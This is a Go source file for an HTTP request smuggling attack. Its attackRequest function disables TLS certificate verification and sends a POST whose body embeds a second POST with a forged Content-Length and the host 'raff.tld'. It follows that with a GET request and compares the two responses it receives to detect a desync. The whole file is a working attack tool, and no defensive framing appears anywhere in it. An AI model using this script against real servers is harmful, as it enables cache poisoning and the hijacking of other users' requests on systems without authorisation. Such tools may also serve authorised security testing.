package main

import (
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"time"
)

var tlsConn *tls.Conn

func attackRequest(host string, port int, path string) (string, string) {
	hostLen := len(host)
	contL := hostLen + 65
	contentLenght := strconv.Itoa(contL)
	var responses1 string = ""
	var responses2 string = ""

	// Create a TCP connection
	tcpConn, err := createTCPConnection(host, port)
	if err == nil {
		defer tcpConn.Close()
		tlsConn, err = createTLSConnection(tcpConn)
		if err == nil {
			defer tlsConn.Close()
			err = sendRequest("POST %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nPOST / HTTP/1.1\r\nHost: raff.tld\r\nUser-Agent: Mozilla/5.0\r\n Content-Type: application/x-www-form-urlencoded\r\nContent-Length: %s\r\n\r\nX", path, host, contentLenght)
			if err == nil {
				err = sendRequest("GET %s?cache1=test2 HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n\r\n", path, host)
				if err == nil {
					responsePrefix := "HTTP/1.1"
					responseCount := 2
					combinedResponse, err := readFullResponse(responsePrefix, responseCount)
					if err == nil {
						if len(combinedResponse) > 1 {

							resp1, resp2, err := splitAndCombineResponses(combinedResponse)
							if err == nil {
								responses1 = resp1
								responses2 = resp2

							}
						}

					}

				}

			}

		}

	}

	return responses1, responses2
}

func createTCPConnection(host string, port int) (net.Conn, error) {
	return net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
}

func createTLSConnection(conn net.Conn) (*tls.Conn, error) {
	return tls.Client(conn, &tls.Config{InsecureSkipVerify: true}), nil
}

func sendRequest(requestFormat string, args ...interface{}) error {
	request := fmt.Sprintf(requestFormat, args...)
	_, err := tlsConn.Write([]byte(request))
	if err != nil {
		return fmt.Errorf("Error sending request: %v", err)
	}
	return nil
}

func readFullResponse(responsePrefix string, responseCount int) (string, error) {
	var responseBuilder strings.Builder
	buffer := make([]byte, 16384) // Adjust the buffer size as needed

	// Count the number of occurrences of responsePrefix
	count := 0

	// Set a default timeout of 1 second
	timeout := 2 * time.Second

	for {
		// Set a read deadline to avoid blocking indefinitely
		err := tlsConn.SetReadDeadline(time.Now().Add(timeout))
		if err != nil {
			return "", err
		}

		n, err := tlsConn.Read(buffer)
		if err != nil {
			// If timeout is reached, break the loop
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				break
			}

			// Return other non-timeout errors
			if err != io.EOF {
				return "", err
			}
		}

		// Break immediately if no data is available to read
		if n == 0 {
			break
		}

		// Process the read data
		responseBuilder.Write(buffer[:n])

		// Check for the occurrence of responsePrefix
		if strings.Contains(responseBuilder.String(), responsePrefix) {
			count++

		}

		// Check for EOF
		if err == io.EOF {
			break
		}
	}

	return responseBuilder.String(), nil
}

func splitAndCombineResponses(combinedResponse string) (responses1, responses2 string, err error) {
	// Use strings.SplitN to avoid unnecessary splits
	splitResult := strings.SplitN(combinedResponse, "HTTP/1.1", 3)

	// Check if the split operation produced at least three elements
	if len(splitResult) >= 3 {
		// Use index 1 and 2 to access the second and third elements
		res1 := "HTTP/1.1" + splitResult[1]
		res2 := "HTTP/1.1" + splitResult[2]
		return res1, res2, nil
	} else {
		// Handle the case where the split operation did not produce the expected result
		return "", "", errors.New("Unable to split the string as expected")
	}
}
